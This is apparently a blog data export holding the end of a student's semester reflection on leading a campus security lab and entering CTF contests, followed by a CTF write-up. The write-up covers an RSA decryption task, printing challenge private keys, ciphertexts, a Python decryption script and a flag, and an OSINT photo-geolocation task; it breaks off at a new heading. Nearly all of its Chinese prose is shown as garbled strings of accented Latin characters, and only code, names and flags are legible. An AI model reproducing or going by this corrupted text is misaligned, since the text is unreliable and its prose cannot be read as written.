åæœˆ\n\nå‡æœŸæ²¡å›å®¶å»é’å²›æ‰¾xjhç©äº†ä¸€åœˆï¼Œç„¶åå°±å¼€å§‹ææ–°ç”Ÿçš„äº‹æƒ…ï¼Œå»æ‹›æ–°çš„æ—¶å€™æˆ‘çœŸçš„ç„¦è™‘æ­»äº†ï¼Œæ˜æ˜è‡ªå·±ä»€ä¹ˆä¹Ÿä¸ä¼šä½†æ˜¯è¿˜æ˜¯è¦ç¡¬ç€å¤´çš®ä¸Šï¼Œæˆ‘ä¸èƒ½è®©å­¦å¼Ÿå­¦å¦¹ä»¬åƒæˆ‘å¤§ä¸€ä¸€æ ·è‰°è‹¦ï¼Œæˆ‘æƒ³åšä¸€ä¸ªå¥½å­¦é•¿ï¼Œåƒæ‚²æƒ¨ä¸–ç•Œçš„å†‰é˜¿è®©ä¸€æ ·ã€‚ç„¶åé™¢é•¿è¿˜ç»™æˆ‘ä»»åŠ¡å»æŠŠæœåŠ¡å™¨æä¸‹æ¥åˆ©ç”¨ä¸Šï¼Œæ„Ÿè°¢èµµå¸ˆå‚…ä¸€ç›´åœ¨å¸®æˆ‘æ¯é¥¬ã€‚è£å§è¿˜ä»»å‘½æˆ‘ä¸ºç½‘ç»œå®‰å…¨ç¤¾å›¢çš„ç¤¾é•¿ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æˆ‘çœŸæ­£å½“ä¸Šå®éªŒå®¤è´Ÿè´£äººçš„æ—¶å€™ã€‚åæœˆå’Œåä¸€æœˆä¸¤ä¸ªæœˆï¼Œæˆ‘æ¯å¤©å¿™çš„å–˜ä¸è¿‡æ°”ï¼Œä¸æ•¢ç¡æ‡’è§‰ï¼Œä¹Ÿä¸æ•¢æ—©ç¡æ¯å¤©éƒ½æŒ¤æ—¶é—´å»å¿™ï¼Œæ›´åˆ«æå­¦ä¹ äº†ï¼Œå»æ›²é˜œçº¿ä¸‹ä¹‹åè·Ÿå‡¯å“¥è®¤è¯†äº†ï¼Œå‡¯å“¥çœ‹æˆ‘è¾›è‹¦çš„æŠ˜è…¾å®éªŒå®¤ç»™æˆ‘è¯´â€œè¡Œï¼Œé’å²›å·¥å­¦é™¢éš”äº†å¥½å‡ ä»£äººç»ˆäºæœ‰ä¸ªèƒ½æ’‘èµ·æ¥çš„äº†â€ï¼Œç„¶åæ¯å¤©æˆ‘å°±ç»™å­¦å¼Ÿå­¦å¦¹ä»¬ç­”ç–‘è§£æƒ‘ï¼Œç»„ç»‡å­¦ä¹ ï¼Œç»™ä»–ä»¬æä¾›å¥½çš„æ¡ä»¶å’Œå­¦ä¹ è·¯çº¿ã€‚éš”å£å®éªŒå®¤çš„é»„å­¦é•¿ä¹Ÿé€æ¸ç†Ÿç»œèµ·æ¥äº†ï¼Œç„¶åä»–å‘Šè¯‰æˆ‘isccæœ‰ä¸ªäººå·¥æ™ºèƒ½èµ›é“ï¼Œä½†æ˜¯æ¶‰åŠåˆ°ä¸€äº›å®‰å…¨æ–¹å‘çš„å†…å®¹ï¼Œè®©æˆ‘å»å¸®å¿™ä¸€èµ·åšï¼Œæˆ‘ç­”åº”äº†è¿˜å¸®å¿™æ‰¾äº†å¥½å‡ ä¸ªäººä¸€èµ·æï¼Œç„¶åè®¤è¯†äº†éš”å£å®éªŒå®¤æ¯”è¾ƒä¼˜ç§€çš„åŒå­¦ä»¬\n\nä½†æ˜¯å¯æƒœçš„æ˜¯å±±ä¸œçœèµ›è´¥å…´è€Œå½’ã€‚\n\n## åä¸€æœˆ\n\nåä¸€æœˆè·Ÿå‡¯å“¥ç»„é˜Ÿæ„Ÿè°¢å‡¯å“¥å¸¦æˆ‘æ‹¿ä¸‹æŠ€èƒ½å…´é²çš„çœä¸‰ï¼Œæˆ‘ä¹Ÿæ‹¿äº†ä¸¤ä¸ªmiscçš„äºŒè¡€ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰ä¸œé“ä¸»ç»™å‹åŠ›çš„è¯å†åŠ ä¸Šå·¥å…·é½å…¨ï¼Œæˆ‘åº”è¯¥å¯ä»¥æ‹¿ä¸‹ä¸¤ä¸ªä¸€è¡€å’Œä¸€ä¸ªäºŒè¡€ï¼Œakmiscã€‚æ˜å¹´å‡¯å“¥å°±ç¦»å¼€å­¦æ ¡äº†ï¼Œéœ€è¦æˆ‘æ¥é¡¶ä¸Šä¸»åŠ›æ¯”èµ›äº†ã€‚å‡¯å“¥ä¹Ÿç…§é¡¾äº†æˆ‘å¾ˆå¤šå¾ˆå¤šï¼Œæˆ‘å¯¹ä»¥åçš„è§„åˆ’ä¹Ÿä¸å†é‚£ä¹ˆè¿·èŒ«ï¼Œå‡¯å“¥æ˜¯æˆ‘è®¤è¯†çš„å­¦é•¿ä¸­æœ€å¥½çš„ä¹Ÿæ˜¯æœ€ç‰›çš„ä¸€ä¸ªã€‚\n\nç„¶åæˆ‘å°±å»ç­¹å¤‡æ ¡èµ›ï¼ŒæœåŠ¡å™¨ä¹Ÿæ”¶æ‹¾å¥½äº†ã€‚\n\n## åäºŒæœˆ\n\nåäºŒæœˆä¸€å¼€å§‹æ¥åˆ°é€šçŸ¥æœ‰ä¸ªé’å²›å¸‚ä¿å¯†æŠ€æœ¯æ¯”èµ›ï¼Œå½“æ—¶è£å§è¯´çœ‹æˆ‘å¤ªè¾›è‹¦è®©æˆ‘å»å¸¦é˜Ÿï¼Œä½†æ˜¯æˆ‘çŸ¥é“è‡ªå·±å®åŠ›ä¸å¤Ÿï¼Œæˆ‘å¸¦é˜Ÿä¸æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œäºæ˜¯æˆ‘è®©èµµå¸ˆå‚…å»äº†ï¼Œæ˜å¹´æˆ‘ä¸€å®šè¦å»å¹¶ä¸”è¦æ‹¿ä¸‹ä¸ªäººå¥–ï¼Œè¿˜æœ‰æµå—çš„æ•°æ®å®‰å…¨æ¯”èµ›å› ä¸ºå’Œæ ¡èµ›å†²çªæ‰€ä»¥å¾ˆé—æ†¾æ²¡å»æˆã€‚\n\nè¿™ä¸ªæœˆè¿˜èƒ½å»å¦é—¨çš„å› ä¸ºisccé‚£è¾¹ä¹Ÿæ‰“è¿›çº¿ä¸‹äº†çº¿ä¸‹æ˜¯å¦é—¨ï¼Œæ˜¯ä¸€ä¸ªç¾å¥½çš„äººç”Ÿç»å†ï¼Œä½†æ˜¯ç”±äºèµ„é‡‘å’Œæ—¶é—´é—®é¢˜å’Œé•¿åŸæ¯åˆèµ›å†²çªäº†æˆ‘ä¸èƒ½å»ä¸è¿‡é˜Ÿé•¿ä¹Ÿæ˜¯å¾ˆäº‰æ°”æŠ±äº†ä¸€ä¸ªå›½äºŒå›æ¥ã€‚é•¿åŸæ¯ï¼Œæˆ‘å¸¦äºŒé˜Ÿï¼Œå­¦é•¿ä»¬å»ä¸€é˜Ÿï¼Œå¥½æ¶ˆæ¯æ˜¯æˆ‘ä»¬éƒ½è¿›çº¿ä¸‹äº†ï¼Œèµ›åˆ¶è¿˜ä¸æ¸…æ¥šä½†è‚¯å®šä¼šè¢«æ‰“çƒ‚çš„ã€‚\n\nä¹Ÿæ˜¯åœ¨è¿™ä¸ªæœˆï¼Œå­¦å¼Ÿä»¬å¼€å§‹å±•éœ²é”‹èŠ’äº†ï¼Œ[sunå¸ˆå‚…](https://sun1028.top/)ï¼Œæ‰¬ç§‹å¸ˆå‚…ï¼Œå’¸é±¼å¸ˆå‚…ï¼Œå°é»„é¼ ç‹¼å¸ˆå‚…Wea5e1è¿˜æœ‰å¹´é¾„æ¯”æˆ‘å¤§çš„å­¦å¼Ÿæ¶µå“¥ï¼Œä»–ä»¬åŒæ ·å¾ˆä¼˜ç§€ï¼Œå‰©ä¸‹çš„å­¦å¼Ÿå­¦å¦¹ä»¬ä¹Ÿæ˜¯è¿œè¶…æˆ‘å¤§ä¸€çš„è¿›åº¦æˆ‘æ„Ÿè§‰ä»–ä»¬éƒ½å¾ˆç‰›ã€‚\n\n## ä¸€æœˆ\n\nä¸€æœˆäº”å·çš„æ—¶å€™æœ‰ä¸ªè½¯ä»¶å®‰å…¨èµ›å·®ç‚¹æ²¡æŠ¥ä¸Šï¼Œä¸è¿‡ä¹Ÿæ˜¯é¡ºåˆ©è¿›å…¥å—äº¬çº¿ä¸‹ï¼Œåœ†æ¢¦äº†ï¼Œç¬¬ä¸€æ¬¡è‡ªå·±å¸¦é˜Ÿå»å’Œå­¦å¼Ÿä»¬æ‰“ï¼Œç¬¬äºŒå¤©è¿˜è¦è€ƒä¸¤é—¨æœŸæœ«ï¼Œç°åœ¨åç­‰çº¿ä¸‹æ‹¿å¥–å˜»å˜»\n\næˆ‘åœ¨å®¶é‡Œç–¯ç‹‚å‹åŠ›å­¦å¼Ÿä»¬ï¼Œè·ŸDemonä¹Ÿç†Ÿç»œèµ·æ¥ç»„äº†å¾ˆå¤šæ¯”èµ›ï¼Œè¿˜åœ¨å°è¯•å¥èº«ï¼Œæ¥ä¸‹æ¥çš„ä¸€æ®µæ—¶é—´æˆ‘éœ€è¦æ”¹å˜ä¸€ä¸‹æ–¹å‘äº†ï¼Œå»è¯•è¯•srcï¼Œæ¯”èµ›æ…¢æ…¢æ”¾ç»™å­¦å¼Ÿä»¬ï¼Œæ‰“å®Œ25å¹´å±±ä¸œçœèµ›æˆ‘å°±é€€å½¹ï¼Œå¿…é¡»æ‹¿ä¸‹ä¸ªäººå¥–\n\n## æ€»ç»“\n\nå¤§äºŒçš„è¿™ä¸ªå­¦æœŸçœŸæ˜¯å……å®åˆ°çˆ†ç‚¸ï¼Œå‡ ä¹æ¯å¤©éƒ½åœ¨å¿™ç¢Œ\n\nå¹¸å¥½æœ‰å­¦é•¿ä»¬çš„å¸®åŠ©ï¼Œå­¦å¼Ÿä»¬ä¹Ÿå¾ˆäº‰æ°”ï¼Œæˆ‘çš„ä»˜å‡ºéƒ½æ˜¯å€¼å¾—çš„ä¹Ÿå¸Œæœ›å­¦å¼Ÿä»¬èƒ½æ¡ä½æ¥åŠ›æ£’æŠŠå®éªŒå®¤æèµ·æ¥.\n","tags":["-éšç¬”"]},{"title":"å¯èˆªæ¯WP","url":"/2025/01/25/å¯èˆªæ¯WP/","content":"\nè¿™æ¬¡å¯èˆªæ¯è·ŸDemonå¸ˆå‚…ç»„é˜Ÿï¼ŒDemonå¸ˆå‚…å¾ˆç‰›åšå‡ºä¸¤ä¸ªmiscä½†æ˜¯webçš„å‘åŠ›æœŸè¢«æˆ‘æˆªæ–­äº†ä¸ç„¶è‚¯å®šå˜å˜åšï¼Œä½†æ˜¯å¿…é¡»æ‰¹è¯„Demonæ‰¾æ¥çš„ä¸¤ä¸ªé˜Ÿå‹æ°´çš„ä¸€é€¼è€Œä¸”æ€åº¦çœŸæ˜¯æ— è¯­ï¼Œæ—©æ—©ç»„å¥½çš„å±€ç«Ÿç„¶æœ‰ä¸ªäººæ²¡æŠ¥åï¼Œç„¶åä¸€æ•´å¤©éƒ½åœ¨å½“æ§å“ï¼Œä¸€ä¸ªezçš„ä¼ªåè®®ç»•è¿‡å°±ç›´æ¥æŠŠä»–å¡æ­»ä¸€æ—©ä¸Šã€‚ä¸‹åˆæˆ‘è®©ä»–å»å†™WP payloadå’Œæ€è·¯éƒ½ç»™äº†ç»“æœæ™šä¸Šäº†ç»™æˆ‘è¯´ï¼šâ€å†™ä¸å‡ºæ¥~â€œå¦ä¸€ä¸ªé€‰æ‰‹ä¹Ÿæ˜¯æå“ï¼ŒæŠ¥åäº†ä½†æ˜¯å¥½åƒæ²¡å‚ä¸ï¼Œç»™ä¸€å·é€‰æ‰‹ç”¨è´¦å·å»äº†ã€‚æœ€åå®šæ¦œ55åï¼Œæˆ‘ä»¥ä¸ºæ˜¯æ²¡å¥–ä½†æ˜¯å¥½åƒæ˜¯å‰70ç»™å¥–ï¼Œä½†æ˜¯æ— æ‰€è°“äº†ï¼Œé¢˜çš„è´¨é‡å¾ˆä¸€èˆ¬ã€‚å¯æƒœmiscè¿˜æ˜¯åšå°‘äº†ç»éªŒå¤ªå°‘ä¸ç„¶æ„Ÿè§‰é™¤äº†ç¬¬äºŒä¸ªosintä»¥å¤–å…¶ä»–çš„åº”è¯¥æ˜¯èƒ½akçš„ï¼Œ\n\nå–è¯ä¹Ÿæ˜¯å¥‡å¥‡æ€ªæ€ªçš„FTKé…äº†åŠå¤©æŒ‚è½½åˆ°æœ¬åœ°ç»“æœè¿˜æ˜¯ä¸å¥½ä½¿ä¸€ç›´æƒé™ä¸å¤Ÿæƒé™ä¸å¤Ÿçš„ï¼Œä¸ç„¶æ„Ÿè§‰è¿˜èƒ½å¤šåšç‚¹å–è¯é¢˜ã€‚\n\nå¹¸äºæœ‰Demonå¸ˆå‚…å¸®æˆ‘åˆ†æ‹…å†™wpçš„é‡æ‹…ï¼Œè€Œä¸”è¿˜ç»™æˆ‘æŠ•å–‚å¥¶èŒ¶å’Œç‚¹å¿ƒçœŸæ˜¯ç ´è´¹äº†ã€‚\n\n## Crypto\n\n### Easy_RSA\n\né¢˜ç›®æ˜¯å¼€å¯å®¹å™¨ç»™é¢˜ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯åŠ¨æ€flag\n\n![20250217132406168.png](D:/lwwblog/source/images/202502/20250217210017773-1739797529725-4.png)\n\n\n$$\nprivate_key = b'-----BEGIN RSA PRIVATE KEY-----\\nMIICWwIBAAKBgQDaRITFDVDfEl8XwGzeiYnK+ZL9tB16amRkn+1je4M7lONcmQEV\\nL673B9YpCZ1HVtD87G7xiHmc/wrgi8bzEVQ06YRLXThg6IoTbT6LUZPYZn8SevBN\\npc46oD8VPfMmplc0DXqg/HJaQYj4HhSTjontsO2ohGExUndlcpQrcDwQBQIDAQAB\\nAoGANF40LMMhICRcRGqatFnzgYuXxN8uI2zbYXktj6zWs7jpRBJBvD+QjxyGOZpg\\n7fjac5SWmcTQyOY4Sd+/gBosRYRA11O+ssWUvYva1pxAW36QYn6BApuuFOJV4iZN\\n7z5lyHdQU9AKW+qfCw5mYBqDu/gQ6aIKIqXcc4yzOuVWfZECQQDpO7X+cDDRUKMS\\nsrT5BUCgLKeZ+EvcItAMFDPctYWx3M4TWs7rx/4mKRLUb4M+kAeMjNRr/uHP1WbO\\nethUI/0HAkEA75LUucqfHxy70m6fM4TDbMd9+l/9rHur9LNOVATyOTtP8o6cEmNw\\n7jIm1+qCdY4UUV04E6JAJCdHfs2XvZPTkwJAARmD+SgkQshjjHIFQmtQ67BqNeKi\\n0O3lFzl9KRw9/iGxYwv5j8kInLty2EeSUdgyAOqlEcFI5Ub3Th/sJzFoPwJAWcBA\\nQXpPMnCpTKR0r/BE5jO2Vl4vwrZyLTIfXgqcVCSMRup2Pc1TOWlAdBM+3JtlsTWj\\nFHfsX573geGzvynqUQJAGVEl858Q0cjbagyTh5ByLxn+dR+Zsixjw7xBX1isJW2+\\n2iiEUVsixyYY3/Yk7/m+B/FF5iTV5G7pNK1oQ35fAA==\\n-----END RSA PRIVATE KEY-----'\npublic_key = b'-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDaRITFDVDfEl8XwGzeiYnK+ZL9\\ntB16amRkn+1je4M7lONcmQEVL673B9YpCZ1HVtD87G7xiHmc/wrgi8bzEVQ06YRL\\nXThg6IoTbT6LUZPYZn8SevBNpc46oD8VPfMmplc0DXqg/HJaQYj4HhSTjontsO2o\\nhGExUndlcpQrcDwQBQIDAQAB\\n-----END PUBLIC KEY-----'\nenmessage:WjCP8Htx9flF7S28xJz/eiwjOJr5QwJ9ZUTLL3PqujMsAWonjLeMLfcHprEY/lcyXOR3CShyE0HqQjEFnRrI0+cnwtFkY3OG341g6mEuwqG364vKmq95FPEi76y9ICdfuagTdAuzhzvISXkgATQ2V31nvgeln1+vuAq0hez9qEM=\nprivate_key = b'-----BEGIN RSA PRIVATE KEY-----\\nMIICXAIBAAKBgQDSkyfKFrEABN38FH5ZWwclPY+7z3I5qp8ckUcp0MDM9AEw9C4U\\n2TpQ6kX7o1DhxaX+lXZsvkY30VTjeFLagQLwyEvEaXkLrCkA6Vt+LRZrGh/eoji2\\nmwZgZQAP5mcNN+zd8UfJ477WiSnyFAhP9xo4Yk/ulBiiXbDzxJ6uENavhwIDAQAB\\nAoGAIlmyBHPrf3V2dtrVpPhF8/ZqaONAHsBtaz4XDe8JUdsTX1Z94UBxvxBbG9+6\\nNSebr/+BYt+D2d19NmGC9opUHaz0ngSTSAbLhJRKLfl/i2aI1I6A/Gj88zi8s6yF\\nsQr8jgLZMg1xYDtjXRRcMRB16fPXecikJBfUuhHocWEtyokCQQDY6o31ZF8mM2rl\\nz1QrOHs5oIAXGgWsrrPQS9dlFsp3b5xo4l7vwgZfl8bSCujfnM4v/KJfJt/TJu9E\\nWlTv8mupAkEA+IQZKsutRpb+zRKd+/jKZV3xXuo+eJGT8rydp5L1xy0Aen+qKZyd\\naTl2dUFUo04/bmxGKmsD/VPPjskpDOy/rwJBAI+7jGlIIwxLEdBJe3pQKMbcpUOp\\niI0ODjQ9rPJdEbfmivus1D+Gj3aUObhAZmKVosKFYoouVi2yJOVj/dgpCFECQF2o\\nkz+QsUYIRBEPciDzO3wGcqAd0dtoqgRyV0w/U4d0C1kfYgb6skxkzqMUMwy0wa0g\\n+zSjTkab3n5mi6UGWJsCQApqGz86U709A3G9gF34G75ePLQVwOI/9RjtzxuIY3Rn\\nBS5ACOsQb/kW1wal2MhCOdWKgDrl0KZpzg855Sh4Rd0=\\n-----END RSA PRIVATE KEY-----'\npublic_key = b'-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDSkyfKFrEABN38FH5ZWwclPY+7\\nz3I5qp8ckUcp0MDM9AEw9C4U2TpQ6kX7o1DhxaX+lXZsvkY30VTjeFLagQLwyEvE\\naXkLrCkA6Vt+LRZrGh/eoji2mwZgZQAP5mcNN+zd8UfJ477WiSnyFAhP9xo4Yk/u\\nlBiiXbDzxJ6uENavhwIDAQAB\\n-----END PUBLIC KEY-----'\nenmessage:OVafA/n9ovZx9rd+mM2lz41u4Ga1xaYJssXApL0hfKwBWTA/XAC+OX4hVk3UWPZbs/68oN/C5LmzwEfyBC0N10cOIuJq78eTvMLaj6tc72PPAbt+0YUBSbIMt6m7/kzty/l5nbZxVt4TCPyH8Zqr4NzriqQhNwjUhrhTGT7wJBs=\n$$\nå…¶å®æˆ‘æ˜¯ä¸å¤ªä¼šå¯†ç çš„ç„¶åé™„ä»¶ç»™äº†ä¸€ä¸ªpyçš„æ¨¡æ¿\n\n```python\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import padding\nfrom cryptography.hazmat.primitives import hashes\nimport base64\n\n# åŠ è½½ç§é’¥\n\nprivate_key_pem = b\"\"\"\n-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQC8NruXkH2ORXb249GMv+8Y3tPd8nu5OOMPUV5L16KELi9AVxoY\nY1v7aEnMXNkUEQ1yeLjyxQrPV3QmQA9jaTLdLf/QgyxGPDlVjjb1g9uxxLr5N0a4\nSLZ9uaQ5EkswTFtvQyHzbC21eowxvVNapHMfEEp5YuThrgQynxuQCcHtswIDAQAB\nAoGAFUNKV8SV5/lBXSypSJvfBfHCgLFQuJZMfIyw46OQSMYzm11butlFaSEZLpJn\nXxolaUMUgy9Z2ckOUPXtZx8u2iv2t1UzJeh3cCbhGok4+Ja69JWoRQeslTk2W2Tx\nTYuUuspQYYrna+cUNsd4MRKMoa+bDosjRy3rqlnvPb5utC0CQQDSvDxlWjvI+pFf\n4fylByLBSlfDDDR80tXoMWj28t43JH+mviyl8rkX7zppH4BVe9IL+0nv+myWuJ8O\nIcQ4SZKHAkEA5KQZxRGMd1Ax1HhFqOPzqMFcszzzp2mpOEbZyhmrCRAa5MUmPIko\nrwYJvYwUWT7a3AZcl/Koi7bqhfFOo43adQJAS76k5rkcLA0EG7aanKaH83nJOa41\nX3hYsnCwDbMV9DQGPeS1H6Cyrsup7wcHlbI/uVbFKKCWT0ZkxSuV37VyGQJBANB2\nUkycgG60fopTEmg3VgwyKHv/gcPNEY2PA7lBh/DebzbQDdm50I8ruSvKES+BoHhl\nkHy1sTiZkOCIsANtLZUCQQCk1BgGGG+sKRHS2/xu3lT3C2Ihn1hrnNLMQ5QlC0JJ\n/FSHxvVpzB8o94PNq6X+KrK6p82WYfkLKl+A5YPhoh/Q\n-----END RSA PRIVATE KEY-----\n\"\"\"\n\n# åŠ è½½ç§é’¥\n\nprivate_key = serialization.load_pem_private_key(private_key_pem, password=None)\n\n# åŠ å¯†çš„æ¶ˆæ¯\n\nenmessage = b\"PfifIriIHAwst7UxsHPNj3CGwlnNWbB5iVVq9O6oEsinLxxJgHcTmBHFGxWA5FC87aHKARXCzwH+v4H1ES/lMSnkVuVfrQdReR62GYIWUYuB2Gb6LnEJ0n4x9sXBA5FrSH9wlu14WT4S+ko+90kCS2jgGC7R2vKRe2QfFFwZ1R8=\"\n\n# è§£å¯†æ¶ˆæ¯\n\nencrypted_message = base64.b64decode(enmessage)\ntry:\n    decrypted_message = private_key.decrypt(\n        encrypted_message,\n        padding.PKCS1v15(),\n\n        # ä½¿ç”¨é€‚å½“çš„å“ˆå¸Œç®—æ³•\n\nâ€‹        algorithm=hashes.SHA256()\nâ€‹    )\nâ€‹    print(decrypted_message.decode())\nexcept Exception as e:\nâ€‹    print(f\"Decryption failed: {e}\")\n\n```\n\nç„¶åå»æ‰¾aiï¼Œä¸€å¼€å§‹æ˜¯ç›´æ¥æ‰”ç»™ä»–æ˜¯ä¸è¡Œçš„ï¼Œä½†æ˜¯å¤šè°ƒæ•™å‡ æ¬¡å°±å¥½\n\npayloadï¼š\n\n```\n# -*- coding: utf-8 -*-\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nimport base64\n\n# åŠ è½½ç§é’¥\nprivate_key = b'''-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDEfgk6+MERVwmKx6b4w4HM+cKlP34Lz7qMICOnDK906zIQyA2a\n7YTba8vssM4jpf+RLda0ZtAWnLj+sVgsBQAaWQ8quUt2FJCFEglpCBbvvsdfBD/A\nWc6w58ekPUWvcMu+Q68EVUre1lSXl8Lt2U0ObB77l577nYAdr7rf7HJMlwIDAQAB\nAoGAAaKQLm7GIdV46DAOckt417J3AtZVv4C/AKN+fclb5xEonX3MqdldcvtL+xri\n3Du+tf/iUCX63UqjOhtSVytuJhuQ2QIUUrkNEPkNBye5aIPN6j4buZXHzyfyVxqy\n6zddT0HTGzIOEn9VIIHMydrrdvEYEd2ZrwlRQApTNAQztGECQQDOllqpJ/R/Kgb3\n8QuJvhN1jDco9DYb9c2+XZL3u5aFZpJ2C86gus2NrK8096V7LOt02Vc0n4gBuXYv\n9BMbo997AkEA832M97qZ+aVi0c0okDv0wORxtDDE/zoXOjzSMS+xMoC7i27Hn/Az\nDL6EHfYBxqj247Tq9QxMBMumclyL/+GOlQJALfwR2i1moxe7zVz+cH663iOD873I\nfZjNX1585GABNViLqXMfX2+1aZ/SsDufvjdVggEPBEuufpPF1w7BYhmsGQJABGJS\nU3OMqi4MJXLoNBCgS4jRc0kdgurs2COYNUKCkkI3Hj+UYJDWmngjsNZpGcaZC2iK\ngncCN2PjT1PTQXwyMQJBAJItDvEaRC8BzlC10h31KC6gmmwU8IsqBYe4B6+btvIT\nUXZ23kO/okQTy65x4MmP5g1XLJAj29jVeZAUW+/B2uo=\n-----END RSA PRIVATE KEY-----'''\n\n# åŠ å¯†åçš„æ¶ˆæ¯\nencrypted_message = b'''EfXlCYvGHy4Haw0cl9dW5ufxMoB9rgturZOVoKokBg/fHOPDpiYY+jeABxMKAgjr\nCbtync9Gx0l0dfYSs06KTKVfR5L4oZbwolWx19bCVWzlQ9f91x1Z8U/uE9fG0xna\n/wUTvrExm8QdKC1OxmSFvPNrffrkEDzEVWP3lTPZ3wQ='''\n\ndef decrypt_message(encrypted_message, private_key):\n    # å¯¼å…¥ç§é’¥\n    key = RSA.import_key(private_key)\n    # ä½¿ç”¨PKCS1_OAEPè§£å¯†\n    cipher = PKCS1_OAEP.new(key)\n    # è§£ç Base64æ ¼å¼çš„åŠ å¯†æ¶ˆæ¯\n    decrypted_message = cipher.decrypt(base64.b64decode(encrypted_message))\n    return decrypted_message.decode()\n\n# è§£å¯†æ¶ˆæ¯\ndecrypted_message = decrypt_message(encrypted_message, private_key)\n\n# è¾“å‡ºè§£å¯†åçš„æ¶ˆæ¯\nprint(\"è§£å¯†åçš„æ¶ˆæ¯:\")\nprint(decrypted_message)\n\n```\n\n![ezrsa2.png](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/ezrsa2.png)\n\n`QHCTF{c0cd580e-2859-469c-b58e-cec1abe77e6d}`\n\n## MISC\n\n### è¯·æ‰¾å‡ºæ‹æ‘„åœ°æ‰€åœ¨ä½ç½®-OSINT\n\nè¿™ä¸ªé¢˜å¾ˆæ¶å¿ƒï¼Œæˆ‘è®¤ä¸º\n\n![è¯·æ‰¾å‡ºæ‹æ‘„åœ°æ‰€åœ¨ä½ç½®.jpg](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/è¯·æ‰¾å‡ºæ‹æ‘„åœ°æ‰€åœ¨ä½ç½®.jpg)\n\nè¯´ä¸€ä¸‹æˆ‘åšè¿™ä¸ªé¢˜ç›®çš„æ€è·¯ï¼Œé¦–å…ˆå°±æ˜¯å¯¹ç€å›¾ç‰‡æœ¬èº«å»æ‰¾ä¸€ä¸‹ä¸»è¦å°±æ˜¯çœ‹exifï¼Œä½†æ˜¯ä¸€èˆ¬è¿™ç§ç½‘ç»œè¿·è¸ªè‚¯å®šæ˜¯ä¸ä¼šç»™çš„ï¼Œæ‰€ä»¥æ²¡æœ‰æ”¶è·å¾ˆæ­£å¸¸ï¼Œç„¶åæˆ‘å°±æŠŠç›®å…‰æ”¾åˆ°é‚£ç§ç²¾å‡†å®šä½çš„åœ°æ–¹äº†ï¼Œæˆ‘æƒ³çœ‹å·¦ä¾§è“è‰²å¤§å·´åé¢å°è½¦æ£šçš„ç”µè¯ï¼Œç›´æ¥å»é—®é—®ï¼ˆå“ˆå“ˆçœŸè¿™ä¹ˆæƒ³çš„ä½†æ˜¯å¯æƒœå¾ˆç³Šè¾¨è®¤ä¸æ¸…æ¥šï¼‰ç„¶åè¿™äº›å‘¨å›´çš„å•†å®¶åº—é“ºå¤ªæ‚ä¹±äº†ï¼Œåœ°å›¾ä¸Šæ˜¯å¾ˆéš¾æ‰¾åˆ°çš„ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ‰¾äº†æƒ³ç¢°ç¢°è¿æ°”ã€‚\n\næ¥ä¸‹æ¥çš„è§£é¢˜æ€è·¯æ˜¯é”å®šå³ä¸Šè§’çš„å¹¿å‘Šï¼ŒæŸ³åŸé¸¿é‘«4såº—ï¼Œç›´æ¥é”æ­»æŸ³å·å¸‚ï¼Œç„¶åå¯¹ç€å•†å®¶åº—é“ºè¾“å‡ºï¼Œæœ€åæœ€å®¹æ˜“æ‰¾åˆ°çš„æ˜¯ç»¿æºç”µåŠ¨è½¦ä¸Šé¢çš„é‚£ä¸ªå…±äº«ç§‘æŠ€ç¾å­¦é¦†ï¼Œç›´æ¥å°±èƒ½é”å®šè¿™ä¸ªè·¯å£\n\nä½†æ˜¯flagæ­»æ´»äº¤ä¸å¯¹ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯æˆ‘æ‰¾é”™äº†\n\n*å°æ˜åœ¨æ¥äº²æˆšå›å®¶è¿‡å¹´æ—¶éšæ‰‹æ‹äº†ä¸€å¼ ç…§ç‰‡ï¼Œä¹‹åä»–åœ¨ç½‘ä¸Šå‘èµ·äº†ä¸€ä¸ªæŒ‘æˆ˜ï¼šæ‰¾åˆ°ç…§ç‰‡ä¸­çš„åœ°ç‚¹å¹¶æ’åå‰ä¸‰çš„äººï¼Œå°†è·å¾—é¢å¤–å¥–åŠ±ã€‚ç°åœ¨ï¼ŒæŒ‘æˆ˜å°±åœ¨ä½ é¢å‰ï¼Œä½ å‡†å¤‡å¥½æ¥å—äº†å—ï¼Ÿ*\n*æäº¤æ–¹å¼ï¼šQHCTF{xxçœ/è‡ªæ²»åŒºxxå¸‚xxå¿/å¸‚/åŒºxxè·¯ä¸xxè·¯äº¤å‰å£}*\n\nçœ‹åˆ°è¿™ä¸ªæäº¤æ ¼å¼ä½ ä¸æ‡µé€¼å—ï¼Ÿ\n\næœ€åè¿‡äº†ä¸€ä¸ªå¤šå°æ—¶æˆ‘å®åœ¨åšä¸å‡ºæ¥çš„æ—¶å€™ååº”è¿‡æ¥è¦ä¸ç„¶è¯•è¯•æ²¡æœ‰/\n\nç›´æ¥æˆåŠŸï¼ŒçœŸæ˜¯æ— è¯­ä»¥åå»ºè®®ç»™æ ¼å¼å°±æ ‡å‡†ä¸€äº›ï¼Œåˆ«è€è¯¯å¯¼æˆ‘ä»¬CTFer\n\n![osint1.png](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/osint1.png)\n\n`QHCTF{å¹¿è¥¿å£®æ—è‡ªæ²»åŒºæŸ³å·å¸‚æŸ³åŸå¿å…­å¹¿è·¯ä¸æ¦•æ³‰è·¯äº¤å‰å£}`\n\n### OSINT-ä½ 